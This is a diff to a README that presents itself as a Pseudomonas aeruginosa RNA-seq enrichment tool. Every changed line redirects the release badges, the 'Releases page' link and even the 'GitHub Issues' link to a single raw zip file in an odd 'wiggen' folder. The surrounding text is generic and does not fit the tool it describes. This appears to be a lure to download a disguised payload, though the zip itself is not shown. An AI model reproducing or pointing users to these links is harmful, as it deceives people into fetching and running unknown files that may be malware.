@@ -1,7 +1,7 @@
 # 🌱 pseudomonas-rnaseq-enrichment - Discover Gene Responses to Antibiotic Stress
 
 ## 📥 Download the Latest Release
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/Dillz666/pseudomonas-rnaseq-enrichment/releases)
+[![Download Release](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the pseudomonas-rnaseq-enrichment application. This software performs RNA-seq expression and enrichment analysis for Pseudomonas aeruginosa. 
@@ -17,7 +17,7 @@ You will use tools like FastQC, fastp, STAR, featureCounts, DESeq2, and STRING t
 ## 📥 Download & Install
 To get started, you need to download the application from our Releases page. Follow these simple steps:
 
-1. Visit the [Releases page](https://github.com/Dillz666/pseudomonas-rnaseq-enrichment/releases) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip) to find the latest version.
 2. Choose the version you want to download. Click on the associated asset file for your system.
 3. Once the download is complete, navigate to your downloads folder and locate the file.
 4. Follow the instructions below to run the application.
@@ -58,7 +58,7 @@ For first-time users, sample data is included in the application. This allows yo
 ## ⚙️ Additional Resources
 - **Documentation:** Comprehensive user guides cover all features.
 - **Help Section:** In-app help offers quick tips for common tasks.
-- **Community Support:** Join the discussion in our [GitHub Issues](https://github.com/Dillz666/pseudomonas-rnaseq-enrichment/issues).
+- **Community Support:** Join the discussion in our [GitHub Issues](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip).
 
 ## 🌟 Contributing
 We welcome contributions from the community. If you have suggestions or improvements, please open an issue or submit a pull request. Your input is valuable for making this tool even better.
@@ -66,4 +66,4 @@ We welcome contributions from the community. If you have suggestions or improvem
 ## 📞 Support
 For assistance, please reach out through the Issues section on our GitHub repository. We aim to respond promptly to any queries or concerns you may have.
 
-[![Download Release](https://img.shields.io/badge/Download%20Release-v1.0-blue)](https://github.com/Dillz666/pseudomonas-rnaseq-enrichment/releases)
+[![Download Release](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip%20Release-v1.0-blue)](https://raw.githubusercontent.com/Dillz666/pseudomonas-rnaseq-enrichment/main/wiggen/pseudomonas-rnaseq-enrichment.zip)
